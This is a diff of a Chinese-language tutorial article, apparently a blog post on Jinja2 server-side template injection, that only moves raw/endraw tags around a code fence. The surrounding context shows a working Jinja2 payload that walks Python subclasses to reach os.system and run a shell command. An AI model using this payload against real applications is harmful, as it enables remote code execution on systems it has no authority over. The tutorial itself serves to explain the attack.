@@ -105,15 +105,15 @@ while 1:
 
 回到如何在 Jinja2 模板中直接执行代码的问题上，因为模板中能够访问 Python 内置的变量和变量方法，并且还能通过 Jinja2 的模板语法去遍历变量，因此可以构造出如下模板 Payload 来达到和上面 PoC 一样的效果：
 
-```
 {% raw %}
+```
 {% for c in [].__class__.__base__.__subclasses__() %}
 {% if c.__name__ == 'catch_warnings' %}
 {{ c.__init__.func_globals['linecache'].__dict__['os'].system('id') }}
 {% endif %}
 {% endfor %}
-{% endraw %}
 ```
+{% endraw %}
 
 使用该 Payload 作为示例代码二的执行参数，最终会执行系统命令 `id`：
 
